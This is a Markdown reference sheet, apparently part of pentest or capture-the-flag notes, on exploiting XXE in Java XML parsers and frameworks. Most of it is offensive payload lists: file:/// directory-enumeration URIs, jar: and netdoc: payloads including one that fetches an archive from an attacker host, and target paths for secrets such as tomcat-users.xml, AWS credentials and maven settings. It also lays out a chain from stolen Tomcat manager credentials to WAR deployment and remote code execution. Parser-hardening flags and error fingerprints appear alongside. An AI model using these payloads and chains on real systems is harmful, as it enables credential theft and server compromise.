# Java-Specific XXE — the `jar:`/`netdoc:`/framework surface

## The Java parser landscape

The Java XML stack is huge — `JAXP` (the spec) + `Xerces` (the impl) +
framework wrappers — `parser-specifics.md` has the matrix; this is the
Java-specific operational depth.

## The `file:///dir/` directory-listing — Java's bonus

`file:///etc/` on Java returns the directory LISTING — not just a
read — the self-directed enumeration oracle:

```
file:///                — root listing
file:///etc/
file:///var/www/
file:///var/www/html/
file:///app/
file:///home/
file:///root/
file:///opt/
file:///usr/share/
file:///usr/lib/
```

The listing reveals filenames to read next — `file:///app/` → see
`config.yml` → read it.

## `jar:`/`netdoc:` — the Java extras

```
jar:file:///app.war!/WEB-INF/web.xml
jar:file:///app.war!/WEB-INF/classes/application.properties
jar:file:///x.jar!/inside/path
jar:http://YOU/x.jar!/y
netdoc:///etc/passwd
netdoc://host/path
```

`jar:` reads inside archives — `netdoc:` ≈ `file:` — Java-only.

## The Java flag-path corpus — the Java-app secret spots

```
file:///app/WEB-INF/web.xml
file:///app/WEB-INF/applicationContext.xml
file:///app/WEB-INF/classes/application.properties
file:///app/WEB-INF/classes/application.yml
file:///app/WEB-INF/classes/application-*.properties
file:///app/WEB-INF/classes/config.yml
file:///app/WEB-INF/classes/bootstrap.yml
file:///app/WEB-INF/classes/log4j*.xml
file:///app/WEB-INF/classes/logback.xml
file:///app/WEB-INF/classes/*.properties
file:///app/WEB-INF/classes/META-INF/persistence.xml
file:///app/WEB-INF/classes/META-INF/spring*.xml
file:///app/WEB-INF/classes/META-INF/MANIFEST.MF
file:///app/WEB-INF/weblogic.xml
file:///app/WEB-INF/jboss-web.xml
file:///opt/tomcat/conf/server.xml
file:///opt/tomcat/conf/context.xml
file:///opt/tomcat/conf/tomcat-users.xml         — manager creds!
file:///opt/tomcat/conf/web.xml
file:///usr/share/tomcat/conf/server.xml
file:///usr/share/tomcat/conf/tomcat-users.xml
file:///var/lib/tomcat*/conf/tomcat-users.xml
file:///etc/tomcat*/tomcat-users.xml
file:///opt/jboss/standalone/configuration/standalone.xml
file:///opt/wildfly/standalone/configuration/standalone.xml
file:///opt/weblogic/.../config.xml
file:///root/.m2/settings.xml                    — maven creds
file:///root/.gradle/gradle.properties
file:///root/.aws/credentials
file:///root/.config/
file:///app/build.gradle /app/pom.xml
file:///app/src/main/resources/application.properties
file:///app/src/main/resources/application.yml
```

## `tomcat-users.xml` — the manager-cred read

`/opt/tomcat/conf/tomcat-users.xml` — the Tomcat manager/users file —
XXE-read the creds → login `/manager/html` → deploy a WAR → RCE —
the XXE→creds→RCE chain.

## The `FEATURE_SECURE_PROCESSING` and the feature-flags

```java
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

`FEATURE_SECURE_PROCESSING` alone does NOT fully block XXE — it sets
entity-expansion LIMITS, not disallow — the gap is real.

## The `EntityResolver`/`LSResourceResolver` — the code-hook

```java
reader.setEntityResolver((pub,sys) -> new InputSource(...));
builder.setEntityResolver(...);
saxParser.getXMLReader().setEntityResolver(...);
```

A custom resolver is the chokepoint — a resolver that returns
`new InputSource(new StringReader(""))` = the "empty-resolver" kill —
a resolver that wraps `URLResolver` = live-fetch — the resolver is code —
`parser-abuse.md`.

## The `StAX`/`XMLInputFactory` properties

```java
XMLInputFactory f = XMLInputFactory.newInstance();
f.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
f.setProperty(XMLInputFactory.SUPPORT_DTD, false);
f.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
```

StAX's own property-names — `IS_SUPPORTING_EXTERNAL_ENTITIES`/
`SUPPORT_DTD` — the StAX hardening.

## The `saxon`/`net.sf.saxon` — the XSLT processor

```java
net.sf.saxon.s9api.Processor
net.sf.saxon.Configuration
net.sf.saxon.Transform
```

Saxon — the enterprise XSLT/XQuery processor — extension-functions
reach Java methods — `xxe-to-rce.md`'s XSLT path.

## The framework-layer parsers — `spring`/`cxf`/`metro`/`axis2`/`jersey`/`jackson`

- `spring-ws`/`spring-oxm` — `XmlConfigHelper`/marshaller config
- `apache-cxf`/`jaxws` — `StaxUtils`/`XMLStreamReader` config
- `metro`/`jaxws-ri` — `XMLStreamReaderFactory`/`StAXSource`
- `axis2` — `AXIOM`/`OMXMLBuilderFactory`/`StAXUtils`
- `jersey`/`jersey-xml` — `MessageBodyReader`/`DocumentBuilderFactory`
- `jackson-xml`/`XmlMapper` — `JacksonXmlModule`/`Woodstox`/`AaltoXml`
- `xstream` — `XStream.fromXML` — `XStream` uses its own driver —
  `StaxDriver`/`DomDriver`/`XppDriver` — the driver decides
- `resteasy`/`resteasy-jaxb` — JAXB unmarshaller
- `commons-digester` — `Digester.parse` — SAX-config
- `castor`/`xmlbeans`/`jibx` — data-binding — SAX under the hood
- `apache-poi` — `XSSFReader`/`XWPF*`/`SAXReader` — Xerces-config
- `apache-tika` — `AutoDetectParser`/`SAXContentHandler` — Xerces
- `apache-solr`/`elastic` — `XMLResponseParser`/`XUpdateProcessor`

## The `xml-apis`/`xerces`/`crimson` — the impl layer

`org.apache.xerces`/`org.apache.xalan`/`com.sun.org.apache.xerces.internal`
(the JDK's shaded Xerces) — the JDK-bundled impl — the `com.sun` package
in an error = the JDK-shaded parser.

## The Java-error fingerprint

```
org.xml.sax.SAXParseException: ...
com.sun.org.apache.xerces.internal....SAXParseException
javax.xml.parsers.ParserConfigurationException
javax.xml.transform.TransformerException
javax.xml.bind.UnmarshalException   — JAXB
javax.xml.stream.XMLStreamException — StAX
org.dom4j.DocumentException
org.jdom.JDOMException
java.io.FileNotFoundException: file:///...
java.net.MalformedURLException: ...
java.io.IOException: Server returned HTTP response code: ...
```

## The "the JDK's shaded Xerces is the parser" — the `com.sun` signature

`com.sun.org.apache.xerces.internal` in an error = the JDK-bundled
Xerces — its default is `external entities on` — the default-live JDK
parser.

## The "the app is Spring/CXF/JAX-WS" — the framework-surface XXE

A `spring-ws`/`cxf`/`jaxws` service — the framework's `MessageBodyReader`/
`XMLStreamReader` config decides — the framework's XXE-config-classes —
`SpringWebServices`/`CxfXmlConfig`/`JaxWs` — grep the framework config.

## The "the `disallowed-doctype` is partial" — the Java-specific split

`external-general-entities=false` kills `&x;` external — `%x;` param
still live → blind XXE works — the two-flag split is the Java gap —
the config-check order:

```
disallow-doctype-decl?   → XInclude only
external-general-entities? → file:-read via &x;?
external-parameter-entities? → %x; live?
load-external-dtd?        → ext-DTD fetch?
XIncludeAware?            → xi:include?
```
